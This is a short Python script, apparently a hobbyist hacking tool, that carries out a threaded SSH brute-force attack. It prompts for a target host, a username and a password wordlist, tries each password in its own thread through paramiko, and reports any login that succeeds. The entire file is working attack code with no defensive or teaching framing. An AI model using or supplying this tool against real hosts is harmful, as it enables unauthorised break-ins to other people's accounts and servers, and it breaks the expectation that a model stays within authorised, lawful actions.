import paramiko, sys, os, socket, termcolor
import threading, time
stop_flag = 0

def ssh_connect(password, code=0):
    global stop_flag
    # Standard lines of code used to connect
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:# specifies the connection information and will leave code = 0 if successful
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        print(termcolor.colored(('[+] Found Password: {} , For Accoun: {}'.format(password, username)), 'green'))
    except:
        print(termcolor.colored('[-] Incorrect Login: {}'.format(password), 'red'))
    ssh.close()

# Asks user for input variables and file paths
host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Passwords File: ')
print('\n')

# Gives us an error message if the file path is incorrect
if os.path.exists(input_file) == False:
    print('[!!] That File/Path Doesnt Exist')
    sys.exit(1)

print('*** Starting Threaded SSH BruteForce On {} With Account: {} ***'.format(host, username))

# Opens our password file
with open(input_file, 'r') as file:
    for line in file.readlines():
        if stop_flag ==1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target = ssh_connect, args=(password,))
        t.start()
        time.sleep(0.5)